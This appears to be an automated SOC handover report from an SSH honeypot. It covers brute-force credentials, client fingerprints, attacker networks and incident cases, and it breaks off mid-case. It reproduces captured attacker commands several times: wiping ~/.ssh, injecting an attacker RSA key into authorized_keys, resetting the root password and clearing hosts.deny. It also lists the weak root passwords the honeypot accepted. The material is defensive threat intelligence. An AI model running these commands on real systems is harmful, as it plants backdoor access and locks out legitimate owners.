# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-15 |
| **Generated At** | 2026-04-15T19:24:41Z |
| **Shift Time** | 19:24 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **156** |
| Confirmed Threats | **118** |
| False Positives Filtered | **38** (24.4%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **6** |
| High Severity Cases | **52** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **104** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **123** |
| Unique Credential Pairs | **61** |
| Unique Usernames | **33** |
| Unique Passwords | **61** |
| Successful Auth Pairs | **33** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 52 |
| `345gs5662d34` | 24 |
| `user` | 4 |
| `server` | 3 |
| `ftpuser` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 25 |
| `345gs5662d34` | 24 |
| `qwerty123@` | 2 |
| `user$` | 2 |
| `Asdfgh` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 25 |
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `qwerty123@` | 2 |
| `user` | `user$` | 2 |
| `root` | `Asdfgh` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Mx123456` | `112.6.227.209` | 2026-04-15T17:20:28 |
| `root` | `3245gs5662d34` | `112.6.227.209` | 2026-04-15T17:20:33 |
| `root` | `qazwsx2022@123` | `182.79.216.98` | 2026-04-15T17:22:27 |
| `root` | `3245gs5662d34` | `182.79.216.98` | 2026-04-15T17:22:29 |
| `root` | `123QWEasd` | `182.79.216.98` | 2026-04-15T17:28:00 |
| `root` | `P4$$w0rd$` | `182.79.216.98` | 2026-04-15T17:29:45 |
| `root` | `qa2ws3ed!@` | `182.79.216.98` | 2026-04-15T17:33:29 |
| `root` | `1234QWE` | `182.79.216.98` | 2026-04-15T17:35:21 |
| `root` | `root0000@@` | `182.79.216.98` | 2026-04-15T17:37:18 |
| `root` | `qwe@2024` | `182.79.216.98` | 2026-04-15T17:43:08 |
| `root` | `Aa!@#123` | `182.79.216.98` | 2026-04-15T17:45:01 |
| `root` | `qazwsx1111111@@` | `182.79.216.98` | 2026-04-15T17:48:37 |
| `root` | `ZAQ!2wsx2026` | `182.79.216.98` | 2026-04-15T17:56:06 |
| `root` | `root.1234` | `182.79.216.98` | 2026-04-15T18:01:37 |
| `root` | `Qwe123456` | `182.79.216.98` | 2026-04-15T18:03:30 |
| `root` | `qwerty123@` | `119.96.158.238` | 2026-04-15T18:59:58 |
| `root` | `3245gs5662d34` | `119.96.158.238` | 2026-04-15T19:00:02 |
| `root` | `Asdfgh` | `77.87.40.114` | 2026-04-15T19:04:12 |
| `root` | `3245gs5662d34` | `77.87.40.114` | 2026-04-15T19:04:16 |
| `root` | `Qazwsx1234@@` | `220.205.123.19` | 2026-04-15T19:08:07 |
| `root` | `3245gs5662d34` | `220.205.123.19` | 2026-04-15T19:08:12 |
| `root` | `qwertyui` | `77.87.40.114` | 2026-04-15T19:08:48 |
| `root` | `qwertyui` | `198.11.172.96` | 2026-04-15T19:09:03 |
| `root` | `3245gs5662d34` | `198.11.172.96` | 2026-04-15T19:09:10 |
| `root` | `!@#123qweASD` | `198.11.172.96` | 2026-04-15T19:10:31 |
| `root` | `Asdfgh` | `198.11.172.96` | 2026-04-15T19:11:59 |
| `root` | `qwerty123@` | `220.205.123.19` | 2026-04-15T19:12:57 |
| `root` | `pakistan` | `220.205.123.19` | 2026-04-15T19:13:30 |
| `root` | `Root1111111@@` | `77.87.40.114` | 2026-04-15T19:15:51 |
| `root` | `odooserver` | `220.205.123.19` | 2026-04-15T19:16:16 |
| `root` | `Zw123456` | `77.87.40.114` | 2026-04-15T19:18:48 |
| `root` | `Zw123456` | `198.11.172.96` | 2026-04-15T19:19:30 |
| `root` | `Root1111111@@` | `198.11.172.96` | 2026-04-15T19:20:14 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **156** |
| Sessions with Fingerprint | **3** |
| Unique HASSH Fingerprints | **3** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 148 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 145 | 8 |
| `f555226df196...` | Mirai/variant | 3 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 145 | 8 | Modern SSH client |
| `f555226df196...` | libssh | 3 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 25 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:G6W3fLf4rA0N"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `220.205.123.19`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `182.79.216.98`, `77.87.40.114`, `112.6.227.209`, `119.96.158.238`, `198.11.172.96`, `220.205.123.19`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **12** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET-BACKBONE | 3 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | LOW |
| `AS9498` | BHARTI Airtel Ltd. | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS44668` | Znet | 1 | HIGH |
| `AS24444` | Shandong Mobile Communication Company Limited | 1 | HIGH |
| `AS134768` | CHINANET SHAANXI province Cloud Base network | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (42)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-3a1bdcf16751

| Field | Detail |
|---|---|
| **Source IP** | `112.6.227[.]209` |
| **First Seen** | 2026-04-15 17:20 |
| **Last Seen** | 2026-04-15 17:20 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:20:27` | `cowrie.session.connect` |
| `2026-04-15 17:20:27` | `cowrie.client.version` |
| `2026-04-15 17:20:27` | `cowrie.client.kex` |
| `2026-04-15 17:20:28` | `cowrie.login.success` |
| `2026-04-15 17:20:29` | `cowrie.session.params` |
| `2026-04-15 17:20:29` | `cowrie.command.input` |
| `2026-04-15 17:20:29` | `cowrie.command.failed` |
| `2026-04-15 17:20:29` | `cowrie.log.closed` |
| `2026-04-15 17:20:29` | `cowrie.session.params` |
| `2026-04-15 17:20:29` | `cowrie.command.input` |
| `2026-04-15 17:20:29` | `cowrie.session.file_download` |
| `2026-04-15 17:20:29` | `cowrie.log.closed` |
| `2026-04-15 17:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.227[.]209` to AbuseIPDB if not already reported
- [ ] Block `112.6.227[.]209` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a9e4ab640c4

| Field | Detail |
|---|---|
| **Source IP** | `112.6.227[.]209` |
| **First Seen** | 2026-04-15 17:20 |
| **Last Seen** | 2026-04-15 17:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:20:32` | `cowrie.session.connect` |
| `2026-04-15 17:20:32` | `cowrie.client.version` |
| `2026-04-15 17:20:32` | `cowrie.client.kex` |
| `2026-04-15 17:20:33` | `cowrie.login.success` |
| `2026-04-15 17:20:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.6.227[.]209` to AbuseIPDB if not already reported
- [ ] Block `112.6.227[.]209` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1793bd3e0b5c

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:22 |
| **Last Seen** | 2026-04-15 17:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:22:27` | `cowrie.session.connect` |
| `2026-04-15 17:22:27` | `cowrie.client.version` |
| `2026-04-15 17:22:27` | `cowrie.client.kex` |
| `2026-04-15 17:22:27` | `cowrie.login.success` |
| `2026-04-15 17:22:27` | `cowrie.session.params` |
| `2026-04-15 17:22:27` | `cowrie.command.input` |
| `2026-04-15 17:22:27` | `cowrie.command.failed` |
| `2026-04-15 17:22:27` | `cowrie.log.closed` |
| `2026-04-15 17:22:27` | `cowrie.session.params` |
| `2026-04-15 17:22:27` | `cowrie.command.input` |
| `2026-04-15 17:22:27` | `cowrie.session.file_download` |
| `2026-04-15 17:22:27` | `cowrie.log.closed` |
| `2026-04-15 17:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ad5ce2673179

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:22 |
| **Last Seen** | 2026-04-15 17:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:22:29` | `cowrie.session.connect` |
| `2026-04-15 17:22:29` | `cowrie.client.version` |
| `2026-04-15 17:22:29` | `cowrie.client.kex` |
| `2026-04-15 17:22:29` | `cowrie.login.success` |
| `2026-04-15 17:22:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a09e7e13a6ff

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:27 |
| **Last Seen** | 2026-04-15 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:27:59` | `cowrie.session.connect` |
| `2026-04-15 17:27:59` | `cowrie.client.version` |
| `2026-04-15 17:27:59` | `cowrie.client.kex` |
| `2026-04-15 17:28:00` | `cowrie.login.success` |
| `2026-04-15 17:28:00` | `cowrie.session.params` |
| `2026-04-15 17:28:00` | `cowrie.command.input` |
| `2026-04-15 17:28:00` | `cowrie.command.failed` |
| `2026-04-15 17:28:00` | `cowrie.log.closed` |
| `2026-04-15 17:28:00` | `cowrie.session.params` |
| `2026-04-15 17:28:00` | `cowrie.command.input` |
| `2026-04-15 17:28:00` | `cowrie.session.file_download` |
| `2026-04-15 17:28:00` | `cowrie.log.closed` |
| `2026-04-15 17:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eb88cdb8e5d5

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:28 |
| **Last Seen** | 2026-04-15 17:28 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:28:01` | `cowrie.session.connect` |
| `2026-04-15 17:28:01` | `cowrie.client.version` |
| `2026-04-15 17:28:01` | `cowrie.client.kex` |
| `2026-04-15 17:28:01` | `cowrie.login.success` |
| `2026-04-15 17:28:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40415719db17

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:29 |
| **Last Seen** | 2026-04-15 17:29 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:29:45` | `cowrie.session.connect` |
| `2026-04-15 17:29:45` | `cowrie.client.version` |
| `2026-04-15 17:29:45` | `cowrie.client.kex` |
| `2026-04-15 17:29:45` | `cowrie.login.success` |
| `2026-04-15 17:29:46` | `cowrie.session.params` |
| `2026-04-15 17:29:46` | `cowrie.command.input` |
| `2026-04-15 17:29:46` | `cowrie.command.failed` |
| `2026-04-15 17:29:46` | `cowrie.log.closed` |
| `2026-04-15 17:29:46` | `cowrie.session.params` |
| `2026-04-15 17:29:46` | `cowrie.command.input` |
| `2026-04-15 17:29:46` | `cowrie.session.file_download` |
| `2026-04-15 17:29:46` | `cowrie.log.closed` |
| `2026-04-15 17:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-499da0d44c29

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:29 |
| **Last Seen** | 2026-04-15 17:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:29:47` | `cowrie.session.connect` |
| `2026-04-15 17:29:47` | `cowrie.client.version` |
| `2026-04-15 17:29:47` | `cowrie.client.kex` |
| `2026-04-15 17:29:47` | `cowrie.login.success` |
| `2026-04-15 17:29:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8677a7a6ab

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:33 |
| **Last Seen** | 2026-04-15 17:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:33:28` | `cowrie.session.connect` |
| `2026-04-15 17:33:28` | `cowrie.client.version` |
| `2026-04-15 17:33:28` | `cowrie.client.kex` |
| `2026-04-15 17:33:29` | `cowrie.login.success` |
| `2026-04-15 17:33:29` | `cowrie.session.params` |
| `2026-04-15 17:33:29` | `cowrie.command.input` |
| `2026-04-15 17:33:29` | `cowrie.command.failed` |
| `2026-04-15 17:33:29` | `cowrie.log.closed` |
| `2026-04-15 17:33:29` | `cowrie.session.params` |
| `2026-04-15 17:33:29` | `cowrie.command.input` |
| `2026-04-15 17:33:29` | `cowrie.session.file_download` |
| `2026-04-15 17:33:29` | `cowrie.log.closed` |
| `2026-04-15 17:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6f3618bcf392

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:33 |
| **Last Seen** | 2026-04-15 17:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:33:30` | `cowrie.session.connect` |
| `2026-04-15 17:33:30` | `cowrie.client.version` |
| `2026-04-15 17:33:30` | `cowrie.client.kex` |
| `2026-04-15 17:33:30` | `cowrie.login.success` |
| `2026-04-15 17:33:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab49085ff10

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:35 |
| **Last Seen** | 2026-04-15 17:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 17:35:21` | `cowrie.session.connect` |
| `2026-04-15 17:35:21` | `cowrie.client.version` |
| `2026-04-15 17:35:21` | `cowrie.client.kex` |
| `2026-04-15 17:35:21` | `cowrie.login.success` |
| `2026-04-15 17:35:21` | `cowrie.session.params` |
| `2026-04-15 17:35:21` | `cowrie.command.input` |
| `2026-04-15 17:35:21` | `cowrie.command.failed` |
| `2026-04-15 17:35:21` | `cowrie.log.closed` |
| `2026-04-15 17:35:22` | `cowrie.session.params` |
| `2026-04-15 17:35:22` | `cowrie.command.input` |
| `2026-04-15 17:35:22` | `cowrie.session.file_download` |
| `2026-04-15 17:35:22` | `cowrie.log.closed` |
| `2026-04-15 17:35:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.79.216[.]98` to AbuseIPDB if not already reported
- [ ] Block `182.79.216[.]98` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8f577f4f84f

| Field | Detail |
|---|---|
| **Source IP** | `182.79.216[.]98` |
| **First Seen** | 2026-04-15 17:35 |
| **Last Seen** | 2026-04-15 17:35 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
